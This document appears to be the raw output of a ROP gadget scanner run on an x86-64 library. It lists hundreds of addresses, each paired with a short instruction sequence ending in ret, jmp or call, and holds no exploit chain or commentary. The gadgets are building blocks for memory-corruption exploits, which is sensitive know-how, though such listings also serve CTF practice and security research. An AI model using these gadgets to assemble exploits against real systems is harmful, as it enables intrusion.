0x00002aaaaabd0da7 : cmp rax, -0xfff ; jae 0xfbdb8 ; ret
0x00002aaaaabd0dd7 : cmp rax, -0xfff ; jae 0xfbde8 ; ret
0x00002aaaaabd1177 : cmp rax, -0xfff ; jae 0xfc188 ; ret
0x00002aaaaabd1357 : cmp rax, -0xfff ; jae 0xfc368 ; ret
0x00002aaaaabd1390 : cmp rax, -0xfff ; jae 0xfc3d1 ; ret
0x00002aaaaabd13f0 : cmp rax, -0xfff ; jae 0xfc431 ; ret
0x00002aaaaabd18e7 : cmp rax, -0xfff ; jae 0xfc8f8 ; ret
0x00002aaaaabd1987 : cmp rax, -0xfff ; jae 0xfc998 ; ret
0x00002aaaaabd19c3 : cmp rax, -0xfff ; jae 0xfca07 ; ret
0x00002aaaaabd1b17 : cmp rax, -0xfff ; jae 0xfcb28 ; ret
0x00002aaaaabd1b47 : cmp rax, -0xfff ; jae 0xfcb58 ; ret
0x00002aaaaabd1b80 : cmp rax, -0xfff ; jae 0xfcbc1 ; ret
0x00002aaaaabd1bd7 : cmp rax, -0xfff ; jae 0xfcbe8 ; ret
0x00002aaaaabd1c10 : cmp rax, -0xfff ; jae 0xfcc51 ; ret
0x00002aaaaabd1c67 : cmp rax, -0xfff ; jae 0xfcc78 ; ret
0x00002aaaaabd1fd7 : cmp rax, -0xfff ; jae 0xfcfe8 ; ret
0x00002aaaaabd2007 : cmp rax, -0xfff ; jae 0xfd018 ; ret
0x00002aaaaabd2037 : cmp rax, -0xfff ; jae 0xfd048 ; ret
0x00002aaaaabd3587 : cmp rax, -0xfff ; jae 0xfe598 ; ret
0x00002aaaaabd35b7 : cmp rax, -0xfff ; jae 0xfe5c8 ; ret
0x00002aaaaaba2030 : cmp rax, 0x2f ; je 0xccffd ; mov eax, 1 ; ret
0x00002aaaaaba1fea : cmp rax, 0x7275 ; jne 0xccfd5 ; xor eax, eax ; ret
0x00002aaaaac485cc : cmp rax, 0xfd ; ja 0x1735a0 ; call 0x1f8b0
0x00002aaaaab4e614 : cmp rax, qword ptr [rdi + 0x10] ; jae 0x79629 ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaabd51c3 : cmp rax, rcx ; cmovne rbx, rax ; call 0xfc3e9
0x00002aaaaab51c48 : cmp rax, rcx ; jae 0x7cc78 ; movzx eax, byte ptr [rax] ; ret
0x00002aaaaabe8dda : cmp rax, rdx ; jb 0x113dd7 ; xor eax, eax ; ret
0x00002aaaaabe8dd9 : cmp rax, rdx ; jb 0x113dd8 ; xor eax, eax ; ret
0x00002aaaaac0c6f0 : cmp rax, rdx ; je 0x137709 ; add rsp, 8 ; ret
0x00002aaaaab1d084 : cmp rax, rdx ; jne 0x4807f ; xor eax, eax ; ret
0x00002aaaaab5cb8c : cmp rax, rdx ; jne 0x87b48 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab502d0 : cmp rax, rsi ; jae 0x7b28a ; movzx eax, byte ptr [rax] ; pop rbx ; ret
0x00002aaaaabe2dd8 : cmp rax, rsi ; jb 0x10ddf2 ; mov eax, 1 ; ret
0x00002aaaaac73bd8 : cmp rbp, rdx ; call qword ptr [rbx]
0x00002aaaaab529ba : cmp rbx, rax ; je 0x7dbe2 ; mov rdx, rax ; jmp 0x7d9eb
0x00002aaaaab53c14 : cmp rbx, rax ; je 0x7ec27 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac48789 : cmp rbx, rbp ; jae 0x17379e ; call qword ptr [rbx]
0x00002aaaaac48789 : cmp rbx, rbp ; jae 0x1737a2 ; call qword ptr [rbx]
0x00002aaaaac487b8 : cmp rbx, rbp ; jb 0x1737b4 ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaac49556 : cmp rbx, rbp ; jb 0x17455b ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab1db7b : cmp rcx, 0xff ; jne 0x48b7a ; mov rax, rdx ; ret
0x00002aaaaac17900 : cmp rcx, qword ptr [rdx + 0x28] ; jae 0x1428eb ; mov eax, 1 ; ret
0x00002aaaaab49f4d : cmp rcx, qword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x00002aaaaac43e1a : cmp rcx, rax ; jne 0x16ee4a ; xor eax, eax ; ret
0x00002aaaaac4340e : cmp rcx, rax ; jne 0x16ee4e ; xor eax, eax ; ret
0x00002aaaaac44c5a : cmp rcx, rax ; jne 0x16fc8a ; xor eax, eax ; ret
0x00002aaaaac44a3e : cmp rcx, rax ; jne 0x16fc8e ; xor eax, eax ; ret
0x00002aaaaab1d467 : cmp rcx, rax ; sbb eax, eax ; and eax, 2 ; sub eax, 1 ; ret
0x00002aaaaab6a146 : cmp rdi, 0xd ; je 0x95162 ; xor byte ptr [rdx + 0xe], 0x2a ; ret
0x00002aaaaac489c7 : cmp rdi, 1 ; ja 0x1739d6 ; ret
0x00002aaaaab1f499 : cmp rdi, r8 ; jbe 0x4a499 ; nop ; pop rbx ; ret
0x00002aaaaabd1240 : cmp rdi, rdx ; ja 0xfc276 ; ret
0x00002aaaaabcae5f : cmp rdi, rsi ; ja 0xf5e56 ; ret
0x00002aaaaab1f5ba : cmp rdi, rsi ; mov rax, rsi ; cmovae rax, rdi ; ret
0x00002aaaaab583d9 : cmp rdx, r8 ; jne 0x833a6 ; ret
0x00002aaaaabe97b1 : cmp rdx, rax ; jne 0x114796 ; ret
0x00002aaaaab805b6 : cmp rdx, rax ; jne 0xab5a8 ; xor eax, eax ; ret
0x00002aaaaabf78e5 : cmp rdx, rax ; sbb eax, eax ; ret
0x00002aaaaac101be : cmp rdx, rcx ; je 0x13b1d6 ; ret
0x00002aaaaab63737 : cmp rdx, rcx ; jne 0x8e726 ; ret
0x00002aaaaab63736 : cmp rdx, rcx ; jne 0x8e727 ; ret
0x00002aaaaaba1ee6 : cmp rdx, rcx ; jne 0xccf15 ; ret
0x00002aaaaabe8eb9 : cmp rdx, rdi ; setae al ; ret
0x00002aaaaac02bf9 : cmp rsi, qword ptr [rdx + 0x28] ; ja 0x12dbf2 ; mov qword ptr [rdx + 0x20], rsi ; ret
0x00002aaaaab71e0d : cmp rsi, rax ; jne 0x9ce0c ; jmp 0x9c7bf
0x00002aaaaab72847 : cmp rsi, rax ; jne 0x9d846 ; jmp 0x9c847
0x00002aaaaab47d59 : cmp rsi, rcx ; jb 0x72d58 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab51009 : cmp rsi, rcx ; jne 0x7c008 ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab1d21c : cmp rsi, rdx ; jne 0x48217 ; xor eax, eax ; ret
0x00002aaaaab4801e : cmp rsi, rdx ; mov eax, 0xffffffff ; ja 0x7303b ; ret
0x00002aaaaabad25a : cmp sil, 0x3f ; ja 0xd827b ; mov eax, 2 ; ret
0x00002aaaaabe4fe2 : cmp sil, al ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaabe500e : cmp sil, dl ; cmovne eax, ecx ; ret
0x00002aaaaac208d7 : cmpsb byte ptr [rsi], byte ptr [rdi] ; adc al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac20bd7 : cmpsb byte ptr [rsi], byte ptr [rdi] ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab413f7 : cmpsb byte ptr [rsi], byte ptr [rdi] ; adc dword ptr [rax], eax ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaac21ad7 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab57186 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4117
0x00002aaaaab62845 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaac217d7 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac43899 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0xc0310000 ; ret
0x00002aaaaab18416 : cmpsb byte ptr [rsi], byte ptr [rdi] ; add edx, dword ptr [rip - 0x3e7cb700] ; add dword ptr [rax - 0x7d], ecx ; ret 0x6610
0x00002aaaaabf83ab : cmpsb byte ptr [rsi], byte ptr [rdi] ; add rcx, 2 ; mov dword ptr [r8], edi ; mov qword ptr [r9], rcx ; ret
0x00002aaaaac7fbe1 : cmpsb byte ptr [rsi], byte ptr [rdi] ; call rdi
0x00002aaaaab00766 : cmpsb byte ptr [rsi], byte ptr [rdi] ; jbe 0x2b772 ; add byte ptr [rbx - 0x76be0008], al ; ret
0x00002aaaaac6b721 : cmpsb byte ptr [rsi], byte ptr [rdi] ; jmp 0x196725
0x00002aaaaaba5ffa : cmpsb byte ptr [rsi], byte ptr [rdi] ; jns 0xd1013 ; add byte ptr [rdx + 0x63], cl ; adc al, 0xb0 ; add rax, rdx ; jmp rax
0x00002aaaaac1bf06 : cmpsb byte ptr [rsi], byte ptr [rdi] ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac214d7 : cmpsb byte ptr [rsi], byte ptr [rdi] ; or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac211d7 : cmpsb byte ptr [rsi], byte ptr [rdi] ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac69b90 : cmpsb byte ptr [rsi], byte ptr [rdi] ; pop rbx ; cld ; call qword ptr [rsi]
0x00002aaaaac08536 : cmpsb byte ptr [rsi], byte ptr [rdi] ; ret 0xffee
0x00002aaaaac69435 : cmpsb byte ptr [rsi], byte ptr [rdi] ; std ; call rsi
0x00002aaaaab413f6 : cmpsb byte ptr ds:[rsi], byte ptr [rdi] ; adc dword ptr [rax], eax ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab40c81 : cmpsd dword ptr [rsi], dword ptr [rdi] ; adc dword ptr [rax], eax ; movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaac203d0 : cmpsd dword ptr [rsi], dword ptr [rdi] ; add al, byte ptr [rax] ; mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x00002aaaaac2039c : cmpsd dword ptr [rsi], dword ptr [rdi] ; add al, byte ptr [rax] ; mov edx, dword ptr [rcx + rdx*4] ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x00002aaaaab2a9c4 : cmpsd dword ptr [rsi], dword ptr [rdi] ; add dword ptr [rax], eax ; add rsp, 0xd8 ; ret
0x00002aaaaab77720 : cmpsd dword ptr [rsi], dword ptr [rdi] ; and al, 0 ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaac6a6d1 : cmpsd dword ptr [rsi], dword ptr [rdi] ; cld ; call rsp
0x00002aaaaac6a591 : cmpsd dword ptr [rsi], dword ptr [rdi] ; cld ; inc dword ptr [rsi] ; scasb al, byte ptr [rdi] ; cld ; call qword ptr [rsi + 0x26fffcad]
0x00002aaaaac6a551 : cmpsd dword ptr [rsi], dword ptr [rdi] ; cld ; jmp qword ptr [rax]
0x00002aaaaac85f11 : cmpsd dword ptr [rsi], dword ptr [rdi] ; cmc ; call rsi
0x00002aaaaac825b1 : cmpsd dword ptr [rsi], dword ptr [rdi] ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab2af35 : cmpsd dword ptr [rsi], dword ptr [rdi] ; imul eax, dword ptr [rcx], 0x7e8b4d00 ; and byte ptr [rax + 1], cl ; ret
0x00002aaaaabffff5 : cmpsd dword ptr [rsi], dword ptr [rdi] ; int 0x29
0x00002aaaaac6ca99 : cmpsd dword ptr [rsi], dword ptr [rdi] ; int1 ; dec esp ; and al, byte ptr [rcx] ; add byte ptr [rdi - 0xf], dl ; jmp rsp
0x00002aaaaac6caa1 : cmpsd dword ptr [rsi], dword ptr [rdi] ; int1 ; jmp rsp
0x00002aaaaac5d065 : cmpsd dword ptr [rsi], dword ptr [rdi] ; jmp rax
0x00002aaaaaad88f2 : cmpsd dword ptr [rsi], dword ptr [rdi] ; ret 0x49ec
0x00002aaaaac693fd : cmpsd dword ptr [rsi], dword ptr [rdi] ; std ; call qword ptr [rcx]
0x00002aaaaabdda42 : cmpsd dword ptr [rsi], dword ptr [rdi] ; sub eax, dword ptr [rax] ; add al, byte ptr [rax] ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaac6a6d0 : cmpsd dword ptr fs:[rsi], dword ptr [rdi] ; cld ; call rsp
0x00002aaaaaad88f1 : cmpsq qword ptr [rsi], qword ptr [rdi] ; ret 0x49ec
0x00002aaaaac48769 : cmpxchg dword ptr [rip + 0x252108], edx ; je 0x17377c ; ret
0x00002aaaaabdd9bd : cmpxchg dword ptr [rip + 0x2ba87c], edx ; je 0x1089d2 ; pop rbp ; ret
0x00002aaaaac48768 : cmpxchg qword ptr [rip + 0x252108], rdx ; je 0x17377d ; ret
0x00002aaaaabdd9bc : cmpxchg qword ptr [rip + 0x2ba87c], rdx ; je 0x1089d3 ; pop rbp ; ret
0x00002aaaaab0f6a3 : cqo ; idiv rsi ; ret
0x00002aaaaac76cb8 : cwde ; adc ebp, ebp ; call rsi
0x00002aaaaaba8c42 : cwde ; add byte ptr [rax], al ; add bh, dh ; dec byte ptr [rbx - 0x7c97dba4] ; ret 0x8d01
0x00002aaaaab92e73 : cwde ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fmul dword ptr [rax - 0x7d] ; ret
0x00002aaaaac099ff : cwde ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaafea6e : cwde ; add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x00002aaaaaafeda8 : cwde ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab0b953 : cwde ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab89bc5 : cwde ; add byte ptr [rax], al ; add byte ptr [rcx + 0x29], al ; ret 0x8341
0x00002aaaaaba979f : cwde ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x4c01
0x00002aaaaabaf4fa : cwde ; add byte ptr [rax], al ; add byte ptr [rcx], bh ; ret 0x947c
0x00002aaaaabf41a9 : cwde ; add byte ptr [rax], al ; test rax, rax ; je 0x11f1c1 ; mov rdi, rbx ; call rax
0x00002aaaaabcc9b5 : cwde ; add dword ptr [rax], eax ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab5973b : cwde ; add rax, rdx ; jmp rax
0x00002aaaaac86e98 : cwde ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaac7c438 : cwde ; cmp al, 0xf0 ; jmp qword ptr [rbx]
0x00002aaaaabd05ff : cwde ; mov qword ptr [rbx + 0x48], rax ; pop rbx ; ret
0x00002aaaaac90348 : cwde ; outsd dx, dword ptr [rsi] ; clc ; call qword ptr [rdi]
0x00002aaaaac90468 : cwde ; outsd dx, dword ptr [rsi] ; clc ; call rcx
0x00002aaaaac84a38 : cwde ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaaad8afd : cwde ; ret
0x00002aaaaab738d4 : cwde ; ret 0xfffe
0x00002aaaaab46384 : cwde ; sahf ; add byte ptr [rax], al ; mov edx, eax ; jmp 0x71326
0x00002aaaaabf856e : cwde ; shr rax, 4 ; ret
0x00002aaaaac8f3a9 : cwde ; sti ; jmp qword ptr [rdx]
0x00002aaaaab78c69 : dec byte ptr [r8 + 0x29] ; ret 0x149
0x00002aaaaab76c51 : dec byte ptr [r8 + 0x29] ; ret 0x280f
0x00002aaaaab78c6a : dec byte ptr [rax + 0x29] ; ret 0x149
0x00002aaaaab76c52 : dec byte ptr [rax + 0x29] ; ret 0x280f
0x00002aaaaab1eab6 : dec byte ptr [rax + 0x29] ; ret 0x8d49
0x00002aaaaab5cb35 : dec byte ptr [rax + 0x39] ; ret 0x3574
0x00002aaaaab5be87 : dec byte ptr [rax - 0x77] ; and byte ptr [rax + 0x31], cl ; ret 0x93be
0x00002aaaaab2e058 : dec byte ptr [rax - 0x77] ; fisttp word ptr [rax - 0x77] ; ret 0x8b48
0x00002aaaaab5fb39 : dec byte ptr [rax - 0x77] ; ret
0x00002aaaaab13054 : dec byte ptr [rbp + 0x29] ; fimul word ptr [rcx + 0x19] ; ret 0xed85
0x00002aaaaaba8c47 : dec byte ptr [rbx - 0x7c97dba4] ; ret 0x8d01
0x00002aaaaab0e1aa : dec byte ptr [rcx + rcx*4 - 0x11] ; call r14
0x00002aaaaab33793 : dec dword ptr [r8 + 0x39] ; ret
0x00002aaaaab55adc : dec dword ptr [r8 - 0x7b] ; ret 0x840f
0x00002aaaaac485ca : dec dword ptr [r8 - 0x7d] ; clc ; std ; ja 0x1735a2 ; call 0x1f8b2
0x00002aaaaab72dc7 : dec dword ptr [r9 - 0x76b706b9] ; clc ; ret
0x00002aaaaac6998f : dec dword ptr [rax + 0x28] ; cld ; call qword ptr [rax]
0x00002aaaaab49039 : dec dword ptr [rax + 0x29] ; ret
0x00002aaaaab78dea : dec dword ptr [rax + 0x29] ; ret 0x149
0x00002aaaaab76d92 : dec dword ptr [rax + 0x29] ; ret 0x280f
0x00002aaaaab131ab : dec dword ptr [rax + 0x29] ; ret 0x8948
0x00002aaaaab84c68 : dec dword ptr [rax + 0x29] ; ret 0x894c
0x00002aaaaaba965c : dec dword ptr [rax + 0x29] ; ret 0x8b48
0x00002aaaaab5418d : dec dword ptr [rax + 0x29] ; ret 0x8d48
0x00002aaaaab1b9c5 : dec dword ptr [rax + 0x29] ; ret 0x8d49
0x00002aaaaab5811d : dec dword ptr [rax + 0x29] ; ret 0x8d4c
0x00002aaaaab33794 : dec dword ptr [rax + 0x39] ; ret
0x00002aaaaab3158f : dec dword ptr [rax + 0x39] ; ret 0x840f
0x00002aaaaab36b8f : dec dword ptr [rax + 0x39] ; ret 0x940f
0x00002aaaaac5d92b : dec dword ptr [rax + 0x54fff451] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5bc4f : dec dword ptr [rax + 0x5f] ; out dx, al ; call rsp
0x00002aaaaac5bc4b : dec dword ptr [rax + 0x5f] ; out dx, al ; dec dword ptr [rax + 0x5f] ; out dx, al ; call rsp
0x00002aaaaab38d29 : dec dword ptr [rax + 0x63] ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaab9a58f : dec dword ptr [rax + 0x63] ; fisttp dword ptr [rax + 0x39] ; ret
0x00002aaaaab31337 : dec dword ptr [rax + 0x63] ; ret
0x00002aaaaabc20f9 : dec dword ptr [rax + 0x63] ; ret 0x8d48
0x00002aaaaabcad59 : dec dword ptr [rax + 0xf] ; add al, 0x24 ; add rsp, 0x18 ; ret
0x00002aaaaab4170b : dec dword ptr [rax + 0xf] ; add dword ptr [r8 - 0x7d], ecx ; ret 0x4502
0x00002aaaaab41e8f : dec dword ptr [rax + 0xf] ; add dword ptr [r8 - 0x7d], ecx ; ret 0x8508
0x00002aaaaab61b29 : dec dword ptr [rax + 0xf] ; mov ebp, 0xf80148c6 ; ret
0x00002aaaaabfcff4 : dec dword ptr [rax + 0xf] ; mov esi, 0x83480153 ; ret
0x00002aaaaab63c84 : dec dword ptr [rax + 0xf] ; mov esp, 0x440f48c7 ; ret 0xc083
0x00002aaaaab0fa02 : dec dword ptr [rax + 0xf] ; ret
0x00002aaaaabcae8b : dec dword ptr [rax + 0xf] ; ret 0x66c3
0x00002aaaaab5bd21 : dec dword ptr [rax + 0xf] ; ret 0x8348
0x00002aaaaab26d76 : dec dword ptr [rax + 0xf] ; ret 0x8d48
0x00002aaaaac16fa6 : dec dword ptr [rax + 0xf] ; ret 0x8d4c
0x00002aaaaab02909 : dec dword ptr [rax + 0xf] ; ret 0x90c3
0x00002aaaaab33bf5 : dec dword ptr [rax + 1] ; ret
0x00002aaaaab0b0c3 : dec dword ptr [rax - 0x2d] ; ror byte ptr [rax + 0x21], 7 ; xor eax, eax ; ret
0x00002aaaaabc037a : dec dword ptr [rax - 0x39] ; mov r8b, 0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaab20686 : dec dword ptr [rax - 0x39] ; ret
0x00002aaaaaba254c : dec dword ptr [rax - 0x39] ; ret 0xffff
0x00002aaaaac105d3 : dec dword ptr [rax - 0x39] ; sbb byte ptr [r8], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0xd], bl ; ret
0x00002aaaaab9468c : dec dword ptr [rax - 0x3f] ; out dx, eax ; add cl, byte ptr [rax - 0x46] ; ret
0x00002aaaaabd05fd : dec dword ptr [rax - 0x68] ; mov qword ptr [rbx + 0x48], rax ; pop rbx ; ret
0x00002aaaaabd2a04 : dec dword ptr [rax - 0x73] ; adc cl, byte ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaab7f0ba : dec dword ptr [rax - 0x73] ; add al, 0x12 ; pop rbx ; and eax, 0x7ff80000 ; ret
0x00002aaaaab9bdd0 : dec dword ptr [rax - 0x73] ; add al, 0xd0 ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab80e36 : dec dword ptr [rax - 0x73] ; cld ; pop rbx ; ret
0x00002aaaaab1b178 : dec dword ptr [rax - 0x73] ; lodsd eax, dword ptr [rsi] ; add byte ptr [rax + 0x63], cl ; ror byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabc095d : dec dword ptr [rax - 0x73] ; mov word ptr [r8 - 0x77], cs ; ret
0x00002aaaaac3d3ea : dec dword ptr [rax - 0x75] ; add dword ptr [rax - 0x77], ecx ; add cl, byte ptr [rax - 0x77] ; clc ; ret
0x00002aaaaab56163 : dec dword ptr [rax - 0x75] ; add eax, 0x341c65 ; xor edi, edi ; call qword ptr [rax]
0x00002aaaaabe62bd : dec dword ptr [rax - 0x75] ; cmp byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabe35ce : dec dword ptr [rax - 0x75] ; cmp r9b, r13b ; ret
0x00002aaaaabd6edd : dec dword ptr [rax - 0x75] ; jge 0x101ee7 ; call rbx
0x00002aaaaabd7190 : dec dword ptr [rax - 0x75] ; jge 0x10219a ; call rbx
0x00002aaaaabd8d28 : dec dword ptr [rax - 0x75] ; jge 0x103d32 ; call rbx
0x00002aaaaaba142c : dec dword ptr [rax - 0x75] ; jge 0xcc3e4 ; call 0x1f8b3
0x00002aaaaabf418b : dec dword ptr [rax - 0x75] ; jnp 0x11f1e3 ; test rdi, rdi ; jne 0x11f18b ; pop rbx ; ret
0x00002aaaaab096bb : dec dword ptr [rax - 0x75] ; js 0x346f3 ; call 0x1f8b3
0x00002aaaaabc006e : dec dword ptr [rax - 0x75] ; mov ebp, 0xffffff78 ; call rbx
0x00002aaaaab1dda7 : dec dword ptr [rax - 0x75] ; pop rbp ; enter -0x74b8, 0x14 ; ret
0x00002aaaaab565cf : dec dword ptr [rax - 0x75] ; push rax ; or dh, dh ; ret 0x7404
0x00002aaaaabb685d : dec dword ptr [rax - 0x75] ; push rbp ; adc byte ptr [rax + 0x39], cl ; ret 0x2575
0x00002aaaaab4f8a1 : dec dword ptr [rax - 0x75] ; push rbx ; sub cl, ch ; ret 0xfffe
0x00002aaaaab3e60b : dec dword ptr [rax - 0x75] ; test dword ptr [rax - 0x16000005], edi ; ret 0xffff
0x00002aaaaab46864 : dec dword ptr [rax - 0x75] ; xchg eax, esp ; and al, 0xe0 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7f], cl ; ret
0x00002aaaaab56141 : dec dword ptr [rax - 0x77] ; and al, 0x18 ; mov qword ptr [rsp + 0x10], r8 ; call rdi
0x00002aaaaab871d8 : dec dword ptr [rax - 0x77] ; call 0x4ccdb5f5
0x00002aaaaab63928 : dec dword ptr [rax - 0x77] ; clc ; ret
0x00002aaaaabd12da : dec dword ptr [rax - 0x77] ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaac1039c : dec dword ptr [rax - 0x77] ; fimul word ptr [rax - 0x77] ; out dx, eax ; call rcx
0x00002aaaaac0ec79 : dec dword ptr [rax - 0x77] ; fimul word ptr [rcx + rcx*4 - 1] ; call r14
0x00002aaaaac48686 : dec dword ptr [rax - 0x77] ; fisttp word ptr [rax - 0x7b] ; push qword ptr [rbp - 0x16] ; pop rbx ; ret
0x00002aaaaab8c403 : dec dword ptr [rax - 0x77] ; fmul dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaac48544 : dec dword ptr [rax - 0x77] ; fucompi st(0) ; pop rbx ; ret
0x00002aaaaab2cfd5 : dec dword ptr [rax - 0x77] ; fucompi st(0) ; ret 0xfc78
0x00002aaaaab08edd : dec dword ptr [rax - 0x77] ; fucompi st(0) ; ret 0xfeb9
0x00002aaaaaaf5fd5 : dec dword ptr [rax - 0x77] ; fucompi st(0) ; ret 0xffe8
0x00002aaaaabc8654 : dec dword ptr [rax - 0x77] ; iretd ; call 0x1f8ae
0x00002aaaaac46f7a : dec dword ptr [rax - 0x77] ; out dx, eax ; add rdi, qword ptr [r13 + 0x10] ; call r12
0x00002aaaaac085e0 : dec dword ptr [rax - 0x77] ; out dx, eax ; call rax
0x00002aaaaaaf733e : dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabd1133 : dec dword ptr [rax - 0x77] ; ret 0x1777
0x00002aaaaabd122e : dec dword ptr [rax - 0x77] ; ret 0x1c77
0x00002aaaaabbed81 : dec dword ptr [rax - 0x77] ; ret 0x2977
0x00002aaaaabc7943 : dec dword ptr [rax - 0x77] ; ret 0x3145
0x00002aaaaab33beb : dec dword ptr [rax - 0x77] ; ret 0x348
0x00002aaaaab4bf93 : dec dword ptr [rax - 0x77] ; ret 0x38b
0x00002aaaaab33d1a : dec dword ptr [rax - 0x77] ; ret 0x38e9
0x00002aaaaabb4e9e : dec dword ptr [rax - 0x77] ; ret 0x448b
0x00002aaaaab0bb2b : dec dword ptr [rax - 0x77] ; ret 0x4577
0x00002aaaaab0b9d1 : dec dword ptr [rax - 0x77] ; ret 0x4f77
0x00002aaaaaba25dc : dec dword ptr [rax - 0x77] ; ret 0x6b8
0x00002aaaaab04acb : dec dword ptr [rax - 0x77] ; ret 0x6fe9
0x00002aaaaabf1e8a : dec dword ptr [rax - 0x77] ; ret 0x8348
0x00002aaaaac144c3 : dec dword ptr [rax - 0x77] ; ret 0x840f
0x00002aaaaab0433f : dec dword ptr [rax - 0x77] ; ret 0x8548
0x00002aaaaab0a5b3 : dec dword ptr [rax - 0x77] ; ret 0x870f
0x00002aaaaab2caf2 : dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaab6b2d6 : dec dword ptr [rax - 0x77] ; ret 0x8949
0x00002aaaaab22915 : dec dword ptr [rax - 0x77] ; ret 0x8b48
0x00002aaaaac09196 : dec dword ptr [rax - 0x77] ; ret 0x8d48
0x00002aaaaaba4688 : dec dword ptr [rax - 0x77] ; ret 0x8d49
0x00002aaaaab3ff20 : dec dword ptr [rax - 0x77] ; ret 0x9ce9
0x00002aaaaab3ea42 : dec dword ptr [rax - 0x77] ; ret 0xb5e8
0x00002aaaaac172af : dec dword ptr [rax - 0x77] ; ret 0xb60f
0x00002aaaaab2e3ab : dec dword ptr [rax - 0x77] ; ret 0xb848
0x00002aaaaab9de9c : dec dword ptr [rax - 0x77] ; ret 0xbb
0x00002aaaaab32ffc : dec dword ptr [rax - 0x77] ; ret 0xbbe9
0x00002aaaaac091d5 : dec dword ptr [rax - 0x77] ; ret 0xbfeb
0x00002aaaaab69ba5 : dec dword ptr [rax - 0x77] ; ret 0xc031
0x00002aaaaabb1460 : dec dword ptr [rax - 0x77] ; ret 0xc148
0x00002aaaaab5bc8e : dec dword ptr [rax - 0x77] ; ret 0xc6eb
0x00002aaaaab7169c : dec dword ptr [rax - 0x77] ; ret 0xc76
0x00002aaaaab04b34 : dec dword ptr [rax - 0x77] ; ret 0xf0e9
0x00002aaaaaaf600a : dec dword ptr [rax - 0x77] ; ret 0xf8e9
0x00002aaaaabd57be : dec dword ptr [rax - 0x77] ; ret 0xff31
0x00002aaaaac02c4a : dec dword ptr [rax - 0x77] ; ret 0xffb8
0x00002aaaaaaf6002 : dec dword ptr [rax - 0x77] ; ret 0xffe9
0x00002aaaaabc7820 : dec dword ptr [rax - 0x77] ; test byte ptr [rax + rcx*4], ah ; add byte ptr [rax], al ; add al, ch ; ret 0xf2cf
0x00002aaaaabc85e6 : dec dword ptr [rax - 0x77] ; xlatb ; call 0x1f8ae
0x00002aaaaac48982 : dec dword ptr [rax - 0x7b] ; fisttp dword ptr [rax - 0x77] ; fidiv dword ptr [rbp - 0x13] ; pop rbx ; ret
0x00002aaaaab55add : dec dword ptr [rax - 0x7b] ; ret 0x840f
0x00002aaaaab9084d : dec dword ptr [rax - 0x7b] ; ror byte ptr [rax + 0xf], 0x44 ; ret 0x8348
0x00002aaaaabe9eef : dec dword ptr [rax - 0x7b] ; ror byte ptr [rax + 0xf], 0x44 ; ret 0x8948
0x00002aaaaab9a79d : dec dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x84 ; ret
0x00002aaaaabc8f84 : dec dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x84 ; ret 0xa
